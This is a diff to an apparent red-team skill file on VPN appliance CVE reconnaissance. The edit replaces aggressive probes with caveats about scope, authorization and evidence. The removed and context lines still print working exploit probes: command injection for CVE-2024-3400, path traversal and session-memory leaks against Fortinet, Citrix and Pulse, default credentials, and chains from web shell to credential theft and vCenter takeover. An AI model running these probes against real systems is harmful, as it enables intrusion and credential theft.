@@ -119,6 +119,15 @@ curl -skI 'https://target/my.policy' | head -10
 
 ---
 
+## Historical CVE leads — not verified applicability
+
+Ranges and example probes below are imported leads, not an authoritative affected
+version list or validated tests. Before selecting a test, read the exact vendor
+advisory and fixed builds/configuration prerequisites. A table entry, status code,
+response size or scanner label alone is not a finding. Traversal/session-memory
+examples can expose real credentials; prefer owner-supplied build evidence and
+synthetic lab fixtures and do not collect unrelated users' sessions.
+
 ## CVE matrix — pre-auth or auth-bypass (2018-2026)
 
 ### Cisco ASA / AnyConnect
@@ -188,13 +197,10 @@ curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
 |---|---|---|---|
 | **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |
 
-```bash
-# CVE-2024-3400 detection
-curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
-  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
-  --data 'jsessionid=test'
-# Look for file-creation side-effect on test path — palo creates file with command output
-```
+The former Cookie probe mixed path creation and `$(id)` and claimed command-output
+proof from a response. It is not a reliable detection recipe. Compare exact build
+and configuration with the vendor advisory first; execution/file-write testing
+requires a separately approved lab procedure and owner-side verification.
 
 ### Pulse Secure / Ivanti Connect Secure / Policy Secure
 
@@ -235,10 +241,10 @@ curl -sk 'https://target/saml/login' | head -30
 ```
 
 Look for:
-- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
-- `WantAssertionsSigned="false"` → severe; assertion-replay possible
+- `AuthnRequestsSigned="false"` is configuration context, not proof of XSW
+- `WantAssertionsSigned="false"` requires checking actual response/assertion signature policy, replay cache and request binding
 - Audience-restriction validation gaps
-- Public SP signing cert (for replay/forging attacks)
+- Public signing certificates are expected metadata, not private signing keys and not evidence of forgery
 
 ---
 
@@ -257,7 +263,7 @@ Look for:
 | F5 Big-IP | admin | admin | Common alternate |
 | SonicWall | admin | password | Factory |
 
-⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.
+Historical default credentials are unverified hints, not a test plan. No fixed attempt count avoids lockout: establish account, distributed rate/lockout policy, test credentials and explicit auth-testing scope before any login attempt.
 
 ---
 
@@ -273,7 +279,7 @@ for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vend
     -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
   echo "$group: ${ms}s"
 done
-# Larger differential timing = group exists; valid groups respond slower in some builds
+# Timing differences are hypotheses only; network/load and WAF effects confound them.
 ```
 
 ---
@@ -297,56 +303,28 @@ If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-s
 
 ---
 
-## Common probe sequence (5-minute fingerprint)
+## Bounded fingerprint example
+
+After the confirmation gate authorizes this exact host and request, collect a
+normal login response only; avoid traversal/session-memory probes in fingerprinting.
 
 ```bash
-TARGET="vpn.target.com"
-
-# Cisco
-curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
-curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
-curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html
-
-# Fortinet
-curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
-curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt
-
-# Citrix
-curl -skI "https://$TARGET/" 2>&1 | head -3
-curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
-HOST=$(python3 -c "print('A' * 24812)")
-curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
-wc -c /tmp/citrix_bleed.txt
-
-# Palo Alto
-curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3
-
-# Pulse / Ivanti
-curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
-curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
+curl --silent --show-error --connect-timeout 5 --max-time 15 \
+  --max-filesize 262144 --head 'https://vpn.client.example/remote/login'
 ```
 
----
-
-## Nuclei templates for fast triage
-
-Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:
-
-```bash
-nuclei -u https://target/ \
-  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
-  -severity high,critical -rl 5
-```
-
-Add `-as` (auto-scan) for broader vuln coverage but slower.
-
----
+Keep TLS verification enabled; use the engagement's approved CA where necessary.
+Headers/cookies identify a candidate product, not its version or vulnerability.
+For any scanner, pin and inspect each selected template for writes, session-data
+extraction and disruption. Use explicit template paths, one authorized target,
+request/concurrency limits and stop conditions; broad tag/auto-scan sweeps are not
+an appliance-safe default. A 404 or large response does not establish patch state.
 
 ## Operational discipline
 
 - **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
 - **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
-- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
+- **SAML metadata may be public** — access it only within authorized scope; redact internal identifiers in reports.
 - **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
 - **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.
 
@@ -363,7 +341,7 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 
 ## Anti-patterns
 
-- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
+- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; compare exact build/configuration and vendor evidence; do not mandate extra exploit attempts
 - **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
 - **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
 - **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
@@ -373,11 +351,12 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 
 ## Related Skills & Chains
 
-- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
-- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
-- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
-- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
-- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.
+`hunt-saml`, `hunt-ntlm-info` and `mid-engagement-ir-detection` may help interpret
+approved evidence. A reachable metadata endpoint is not a SAML bypass; a known
+CVE is not proof of file-write-to-root or a universal exploit chain. Credential
+extraction, reuse, persistence and internal pivots require their own written scope
+and confirmation; stop at the approved proof threshold and never reuse session
+tokens recovered from another user's traffic.
 
 ## Limitations
 
